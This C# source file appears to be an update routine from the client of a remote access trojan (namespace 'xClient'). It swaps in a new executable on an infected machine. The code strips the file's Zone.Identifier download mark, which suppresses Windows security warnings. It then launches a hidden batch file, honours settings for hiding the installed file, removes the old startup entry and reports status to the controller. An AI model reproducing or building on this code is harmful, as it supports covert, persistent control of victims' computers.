using System;
using System.Diagnostics;
using System.IO;
using xClient.Config;
using xClient.Core.Helper;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Utilities;

namespace xClient.Core.Installation;

public static class ClientUpdater
{
	public static void Update(Client client, string newFilePath)
	{
		try
		{
			FileHelper.DeleteZoneIdentifier(newFilePath);
			if (!FileHelper.IsValidExecuteableFile(File.ReadAllBytes(newFilePath)))
			{
				throw new Exception("no pe file");
			}
			string text = FileHelper.CreateUpdateBatch(newFilePath, Settings.INSTALL && Settings.HIDEFILE);
			if (string.IsNullOrEmpty(text))
			{
				throw new Exception("Could not create update batch file.");
			}
			Process.Start(new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true,
				FileName = text
			});
			if (Settings.STARTUP)
			{
				Startup.RemoveFromStartup();
			}
			Program.ConnectClient.Exit();
		}
		catch (Exception ex)
		{
			NativeMethods.DeleteFile(newFilePath);
			new SetStatus($"Update failed: {ex.Message}").Execute(client);
		}
	}
}
